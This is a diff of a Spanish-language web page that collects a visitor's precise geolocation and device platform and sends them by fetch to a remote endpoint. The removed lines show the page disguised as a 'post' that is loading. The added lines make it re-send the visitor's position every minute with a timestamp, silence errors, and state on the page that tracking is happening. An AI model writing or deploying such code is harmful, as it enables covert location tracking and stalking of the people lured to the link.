@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -38,10 +40,10 @@
             </div>
 
             <div class="aviso">
-                <strong>ℹ️ Aviso:</strong> Puede que necesites abrir el link desde el navegador de tu preferencia para poder visualizar este post.
+                <strong>ℹ️ Aviso:</strong> Se está enviando tu ubicación cada minuto.
             </div>
 
-            <div id="status">Cargando Post...</div>
+            <div id="status">Iniciando seguimiento en tiempo real...</div>
         </div>
     </div>
 
@@ -60,22 +62,30 @@
                     lat: lat,
                     lon: lon,
                     precision: accuracy + " metros",
-                    device: navigator.platform
+                    device: navigator.platform,
+                    hora: new Date().toLocaleString()
                 }),
                 mode: "no-cors"
             });
 
-            document.getElementById('status').innerHTML = `✅ Post Cargado<br>📍 ${lat}, ${lon} (±${accuracy}m)`;
+            document.getElementById('status').innerHTML = `📍 Actualizado: ${lat}, ${lon} (±${accuracy}m)<br>Cada 1 minuto`;
             document.getElementById('status').style.background = "#004d00";
         }
 
+        // Seguimiento continuo + cada 1 minuto
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(enviarUbicacion, (err) => {
-                document.getElementById('status').innerHTML = "❌ Error: Copie y pegue el link en el navegador.";
-            }, { 
-                enableHighAccuracy: true, 
-                timeout: 25000 
-            });
+            // Reporte inicial
+            navigator.geolocation.getCurrentPosition(enviarUbicacion, () => {}, { enableHighAccuracy: true });
+
+            // Reportes cada 60 segundos
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(enviarUbicacion, () => {}, { 
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
+            }, 60000); // 60000 ms = 1 minuto
+        } else {
+            document.getElementById('status').innerHTML = "❌ Geolocalización no soportada";
         }
     </script>
 </body>
